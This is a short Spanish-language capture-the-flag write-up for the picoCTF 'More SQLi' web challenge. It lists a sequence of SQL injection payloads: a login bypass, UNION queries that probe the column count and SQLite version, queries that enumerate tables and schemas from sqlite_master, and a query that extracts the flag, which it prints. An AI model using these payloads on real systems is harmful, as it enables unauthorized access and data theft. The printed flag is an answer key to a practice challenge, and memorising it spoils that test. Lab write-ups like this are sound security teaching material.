### More SQLi
### Descripcion
Can you find the flag on this website.

Additional details will be available after launching your challenge instance.

Try to find the flag [here](http://saturn.picoctf.net:60952/).


### Solucion
inyeccion sql para logearse
password' or 1=1 --
en el campo password porque es el primero en la query y permite obviar el user

inyeccion para saber numero de campos
select * from ciudades where city = 'hola' union select 1,2,3;

inyeccion para saber la version de sqlite
hola' union select 1,sqlite_version(),3;

inyeccion para saber los nombres de tablas
ciudad' union select 1,2,tbl_name FROM sqlite_master WHERE type='table' ;

inyeccion para saber los sqls de cada tabla
ciudad' union select 1,sql,tbl_name FROM sqlite_master WHERE type='table' ;

SQLS:
|1|CREATE TABLE hints (id INTEGER NOT NULL PRIMARY KEY, info TEXT)|hints|
|1|CREATE TABLE more_table (id INTEGER NOT NULL PRIMARY KEY, flag TEXT)|more_table|
|1|CREATE TABLE offices (id INTEGER NOT NULL PRIMARY KEY, city TEXT, address TEXT, phone TEXT)|offices|
|1|CREATE TABLE users (name TEXT NOT NULL PRIMARY KEY, password TEXT, id INTEGER)|users|



inyeccion para obtener la flag
ciudad' union select 1,flag,3 FROM more_table;

picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_62aa7500}
### Notas adicionales

### Referencias